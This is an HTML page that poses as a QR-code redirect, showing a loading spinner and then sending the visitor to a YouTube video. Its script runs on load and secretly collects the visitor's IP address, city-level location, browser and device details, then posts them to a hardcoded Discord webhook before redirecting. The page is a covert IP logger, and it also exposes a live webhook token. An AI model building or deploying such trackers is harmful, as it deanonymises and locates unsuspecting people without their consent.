<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting to the website...</title>
    <style>
        body {
            background-color: #0f0f0f;
            color: white;
            font-family: 'Roboto', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .container {
            max-width: 500px;
            padding: 20px;
        }
        .monstr-logo {
            font-size: 48px;
            color: #ff0000;
            margin-bottom: 20px;
        }
        .loader {
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top: 3px solid #ff0000;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="monstr-logo">▶️</div>
        <h2>Redirecting to website...</h2>
        <div class="loader"></div>
        <p>You will be redirected shortly...</p>
    </div>

    <script>
        // Webhook URL
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1413562343006146720/lb_5cE_VQmAqoSMQsO-XB80APyqcH08gqAjEN2ks7N0fE1f_mPcizwO4gJaPuk6_q-TI";

        // Function to get IP information
        async function getIPInfo() {
            try {
                // Get IP address
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ip = ipData.ip;
                
                // Get location information based on IP
                let locationInfo = {};
                try {
                    const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
                    locationInfo = await locationResponse.json();
                } catch (e) {
                    console.error('Error fetching location:', e);
                }
                
                // Get device/browser information
                const browserInfo = {
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform,
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                };
                
                return {
                    ip,
                    location: locationInfo,
                    browser: browserInfo,
                    timestamp: new Date().toISOString(),
                };
            } catch (error) {
                console.error('Error getting IP info:', error);
                return null;
            }
        }

        // Function to send data to Discord webhook
        async function sendToDiscord(webhookUrl, data) {
            try {
                // Format the message for Discord
                const message = {
                    content: "User scanned QR code!",
                    embeds: [
                        {
                            title: "QR Code Scan Information",
                            color: 16711680, // Red color
                            fields: [
                                {
                                    name: "IP Address",
                                    value: data.ip,
                                    inline: true
                                },
                                {
                                    name: "Location",
                                    value: data.location.country_name ? 
                                        `${data.location.city}, ${data.location.region}, ${data.location.country_name}` : 
                                        'Unknown',
                                    inline: true
                                },
                                {
                                    name: "Device",
                                    value: data.browser.platform,
                                    inline: true
                                },
                                {
                                    name: "Browser",
                                    value: data.browser.userAgent.substring(0, 50) + '...',
                                    inline: false
                                },
                                {
                                    name: "Timestamp",
                                    value: new Date(data.timestamp).toLocaleString(),
                                    inline: true
                                }
                            ]
                        }
                    ]
                };
                
                // Send to Discord
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(message)
                });
                
                return response.ok;
            } catch (error) {
                console.error('Error sending to Discord:', error);
                return false;
            }
        }

        // Function to redirect to YouTube
        function mnsterredir() {
            window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
        }

        // Main execution
        async function main() {
            // Get IP information
            const ipInfo = await getIPInfo();
            
            if (ipInfo) {
                // Send to Discord
                await sendToDiscord(WEBHOOK_URL, ipInfo);
            }
            
            // Redirect to YouTube after 2 seconds
            setTimeout(mnsterredir, 2000);
        }

        // Run the main function
        main();
    </script>
</body>
</html>
